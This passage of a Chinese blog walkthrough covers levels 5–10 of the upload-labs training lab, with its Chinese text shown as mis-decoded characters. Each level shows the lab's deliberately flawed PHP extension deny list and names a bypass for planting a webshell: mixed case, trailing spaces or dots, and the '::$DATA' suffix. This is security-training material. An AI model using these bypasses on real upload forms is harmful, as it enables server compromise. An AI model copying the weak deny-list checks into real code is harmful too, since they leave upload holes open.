class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ é™¤äº†è¯¥è¯­å¥ï¼š<code>$file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™</code></p><p>+++</p><ul><li>æ‹¦æˆªæ–¹å¼ï¼š<strong>æœåŠ¡ç«¯é»‘åå•è¶…çº§åŠ å¼º</strong>;.htaccessåŠ å…¥äº†é»‘åå•ï¼Œå–æ¶ˆäº†åç¼€åå…¨å˜ä¸ºå°å†™å­—æ¯çš„strtolowerï¼ˆï¼‰å‡½æ•°</li><li>ç»•è¿‡æ–¹å¼ï¼šé‡‡ç”¨å¤§å°å†™æ··åˆæ–¹å¼ç»•è¿‡.PhP,.PHp5ï¼Œæˆ–ç€.hTacCesSæ–‡ä»¶â€¦</li></ul><p><img src="https://s1.ax1x.com/2020/05/02/JvR0FH.png" alt="JvR0FH.png"></p><p>ä¸Šä¼ æˆåŠŸï¼</p><p>+++</p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š*<em>æç¤ºï¼šæ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼  *</em></p><p>æŸ¥çœ‹æç¤ºï¼š</p><blockquote><p>æœ¬passç¦æ­¢ä¸Šä¼ .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swfåç¼€æ–‡ä»¶ï¼</p></blockquote><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ '</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æç¤ºå’Œæºç é‡Œçš„é»‘åå•å¹¶ä¸ä¸€è‡´ï¼Œæç¤ºé‡Œå°‘äº†.htaccess<br><code>$file_ext = trim($file_ext); //é¦–å°¾å»ç©º</code><br>+++</p></blockquote><ul><li>æ‹¦æˆªæ–¹å¼ï¼š<strong>æœåŠ¡ç«¯é»‘åå•</strong>;å»æ‰äº†å»é™¤ç©ºæ ¼çš„trimå‡½æ•°ï¼›</li><li>ç»•è¿‡æ–¹å¼ï¼šé€‰æ‹©åç¼€ä¸º<code>.php</code>çš„ä¸€å¥è¯ä¸Šä¼ ï¼ŒæŠ“åŒ…ååœ¨åé¢å¢åŠ ç©ºæ ¼;</li></ul><p><img src="https://s1.ax1x.com/2020/05/02/JvRylt.png" alt="JvRylt.png"></p><p>ä¸Šä¼ æˆåŠŸï¼</p><p>+++</p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š*<em>æç¤ºï¼šæ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼  *</em></p><p>æŸ¥çœ‹æç¤ºï¼š</p><blockquote><p>æœ¬passç¦æ­¢ä¸Šä¼ æ‰€æœ‰å¯ä»¥è§£æçš„åç¼€ï¼</p></blockquote><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote></blockquote><p>+++</p><ul><li>æ‹¦æˆªæ–¹å¼ï¼š<strong>æœåŠ¡ç«¯é»‘åå•</strong>;</li><li>ç»•è¿‡æ–¹å¼ï¼šæ²¡æœ‰åˆ é™¤ç»“å°¾çš„â€œ.â€ï¼Œåˆ©ç”¨windowsç‰¹æ€§ï¼Œä¼šè‡ªåŠ¨å»æ‰åç¼€åä¸­æœ€åçš„â€.â€ï¼Œå¯åœ¨åç¼€åä¸­åŠ â€.â€ç»•è¿‡;</li></ul><p>+++</p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š*<em>æç¤ºï¼šæ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼  *</em></p><p>æŸ¥çœ‹æç¤ºï¼š</p><blockquote><p>æœ¬passç¦æ­¢ä¸Šä¼ .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccessåç¼€æ–‡ä»¶ï¼</p></blockquote><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote></blockquote><p>+++</p><ul><li>æ‹¦æˆªæ–¹å¼ï¼š<strong>æœåŠ¡ç«¯é»‘åå•</strong>;</li><li>ç»•è¿‡æ–¹å¼ï¼šWindowsç³»ç»Ÿä¸‹ï¼Œå¦‚æœä¸Šä¼ çš„æ–‡ä»¶åä¸­test.php::$DATAä¼šåœ¨æœåŠ¡å™¨ä¸Šç”Ÿæˆä¸€ä¸ªtest.phpçš„æ–‡ä»¶ï¼Œå…¶ä¸­å†…å®¹å’Œæ‰€ä¸Šä¼ æ–‡ä»¶å†…å®¹ç›¸åŒï¼Œå¹¶è¢«è§£æã€‚</li></ul><p>+++</p><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p>é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š*<em>æç¤ºï¼šæ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼  *</em></p><p>æŸ¥çœ‹æç¤ºï¼š</p><blockquote><p>æœ¬passåªå…è®¸ä¸Šä¼ .jpg|.png|.gifåç¼€çš„æ–‡ä»¶ï¼</p></blockquote><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote></blockquote><p>+++</p><ul><li><p>æ‹¦æˆªæ–¹å¼ï¼š<strong>æœåŠ¡ç«¯é»‘åå•</strong>;</p></li><li><p>ç»•è¿‡æ–¹å¼ï¼š</p><ul><li><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$im</span>g_path = UPLOAD_PATH.<span class="string">'/'</span>.<span class="symbol">$file</span>_name;</span><br><span class="line">è·¯å¾„æ‹¼æ¥çš„æ˜¯å¤„ç†åçš„æ–‡ä»¶å</span><br></pre></td></tr></table></figure></li><li><p>åŠ  <strong>ç‚¹+ç©ºæ ¼+ç‚¹</strong></p></li></ul></li></ul><p>+++</p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š*<em>æç¤ºï¼šæ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼  *</em></p><p>æŸ¥çœ‹æç¤ºï¼š</p><blockquote><p>æœ¬passä¼šä»æ–‡ä»¶åä¸­å»é™¤.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccesså­—ç¬¦ï¼</p></blockquote><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span 